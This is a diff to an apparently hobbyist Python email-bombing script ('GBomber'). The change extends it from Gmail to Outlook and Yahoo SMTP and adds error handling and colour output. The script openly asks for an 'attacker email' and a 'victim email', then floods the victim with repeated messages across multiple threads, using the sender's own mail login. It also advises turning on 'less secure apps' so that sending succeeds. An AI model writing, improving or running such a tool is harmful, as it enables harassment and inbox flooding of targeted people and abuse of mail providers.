@@ -3,46 +3,28 @@
 import signal
 import smtplib
 import getpass
-from sys import stdout
 from pwn import *
 
 #Colors
-def red():
+class colors:
 	RED = "\033[1;31m\033[1m"
-	stdout.write(RED)
-
-def blue():
+	YELLOW = "\033[0;33m\033[1m"
+	GREEN = "\033[0;32m\033[1m"
 	BLUE = "\033[0;36m\033[1m"
-	stdout.write(BLUE)
-
-def purple():
 	PURPLE = "\033[0;35m\033[1m"
-	stdout.write(PURPLE)
-
-def gray():
 	GRAY = "\033[0;37m\033[1m"
-	stdout.write(GRAY)
-
-def end():
 	END = "\033[0m"
-	stdout.write(END)
 
 def banner():
-	blue()
-	print("""\n	   ___     ___                    _
-	  / __|   | _ )    ___    _ __   | |__     ___      _ _  \t\t\t\tBY Invertebrado
-	 | (_ |   | _ \   / _ \  | '  \  | '_ \   / -_)    | '_|
-	  \___|   |___/   \___/  |_|_|_| |_.__/   \___|   _|_|_\tPERSONAL PAGE https://invertebr4do.github.io
-	_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|  \tGITHUB https://github.com/Invertebr4do
-	"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'""")
-	end()
-
-banner()
+	print(colors.BLUE + "\n   ___     ___                    _\n  / __|   | _ )    ___    _ __   | |__     ___      _ _  \t\t\t\t" + colors.GRAY + "BY" + colors.YELLOW + " Invertebrado")
+	print(colors.BLUE + " | (_ |   | _ \   / _ \  | '  \  | '_ \   / -_)    | '_|")
+	print(colors.BLUE + "  \___|   |___/   \___/  |_|_|_| |_.__/   \___|   _|_|_\t" + colors.GRAY + "PERSONAL PAGE" + colors.GREEN + " https://invertebr4do.github.io")
+	print(colors.BLUE + "_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|  \t" + colors.GRAY + "GITHUB" + colors.PURPLE + " https://github.com/Invertebr4do")
+	print(colors.BLUE + " `-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'" + colors.END)
 
 def def_handler(sig, frame):
-	red()
-	print("\n[!] Exiting...")
-	end()
+	print(colors.RED + "\n[!] Exiting..." + colors.END)
+
 	if threading.activeCount() > 1:
 		os.system("tput cnorm")
 		os._exit(getattr(os, "_exitcode", 0))
@@ -55,40 +37,40 @@ signal.signal(signal.SIGINT, def_handler)
 subject = open("subject_content.txt", "r")
 content = open("message_content.txt", "r")
 
-gray()
-from_address = input(str("\n[*] Enter your attacker email: "))
-gray()
-to_address = input(str("[*] Enter the victim email: "))
-gray()
-m_t = input("\n[*] How many threads do you want to use? [less is better]: ")
-gray()
-password = getpass.getpass('\n[*] Enter the password for [%s]: ' % from_address.rstrip("\n"))
-end()
+banner()
 
-if len(password.rstrip()) < 1:
-	red()
-	print("\n[-] Invalid password")
-	end()
-	sys.exit(1)
+from_address = input(str("\n" + colors.GREEN + "█" + colors.GRAY + " Enter your attacker email" + colors.GREEN + " >> " + colors.END))
+to_address = input(str(colors.GREEN + "█" + colors.GRAY + " Enter the victim email" + colors.GREEN + " >> " + colors.END))
 
 if '@' not in from_address or '@' not in to_address:
-        red()
-        print("\n[-] Invalid email address")
-        end()
+        print(colors.RED + "\n[-] Invalid email address" + colors.END)
         sys.exit(1)
 
-if 'gmail' not in from_address or 'gmail' not in to_address:
-	red()
-	print("\n[-] Only for gmail accounts")
-	end()
+elif 'gmail.' in from_address or 'gmail.' in to_address:
+        WEmail = "smtp.gmail.com"
+
+elif 'hotmail.' in from_address or 'outlook.' in from_address or 'hotmail.' in to_address or 'outlook.' in to_address:
+        WEmail = "smtp-mail.outlook.com"
+
+elif 'yahoo.' in from_address or 'yahoo.' in to_address:
+        WEmail = "smtp.mail.yahoo.com"
+
+else:
+        print(colors.RED + "\n[-] Invalid email address" + colors.END)
+        sys.exit(1)
+
+m_t = input("\n" + colors.GREEN + "█" + colors.GRAY + " How many threads do you want to use? " + colors.PURPLE + "[less is better]" + colors.GREEN + " >> " + colors.END)
+
+password = getpass.getpass(colors.PURPLE + "\n█" + colors.GRAY + " Enter the password for [%s] >> " % from_address.rstrip("\n"))
+
+if len(password.rstrip()) < 1:
+	print(colors.RED + "\n[-] Invalid password" + colors.END)
 	sys.exit(1)
 
 if int(m_t) < 1:
 	m_t = 1
 
-purple()
-print("\n" + "-"*80 + "\n")
-end()
+print(colors.PURPLE + "-"*80 + "\n" + colors.END)
 
 p1 = log.progress("Emails sent")
 p2 = log.progress("Email content")
@@ -103,15 +85,24 @@ def sendSpam():
 			%s
 			""" % (s, c)
 
-			server = smtplib.SMTP('smtp.gmail.com', 587)
-			server.starttls()
-			server.login(from_address, password)
-			server.sendmail(from_address, to_address, message.encode('utf-8'))
-			server.quit()
+			try:
+				server = smtplib.SMTP(WEmail, 587)
+				server.starttls()
+				server.login(from_address, password)
+				server.sendmail(from_address, to_address, message.encode('utf-8'))
+				server.quit()
 
-			p1.status("%d" % emails)
-			emails += 1
-			break
+				p1.status("%d" % emails)
+				emails += 1
+				break
+
+			except smtplib.SMTPAuthenticationError:
+				print("\n" + colors.RED + "-"*80 + "\n█ Email or Password incorrect\n\n" + colors.YELLOW + "█ " + colors.GRAY +  "If your credentials are correct, enable less secure apps permisions " + colors.YELLOW + "█\n\n" + colors.RED + "█" + colors.GRAY + " Gmail" + colors.YELLOW + " >> " + colors.GRAY + "https://myaccount.google.com/lesssecureapps\n" + colors.PURPLE + "█" + colors.GRAY + " Yahoo" + colors.YELLOW + " >> " + colors.GRAY + "https://login.yahoo.com/account/security" + colors.END)
+				sys.exit(1)
+
+			except:
+				log.failure("Failed to send, try again")
+				sys.exit(1)
 
 	p1.success("%d" % emails)
 	sys.exit(0)
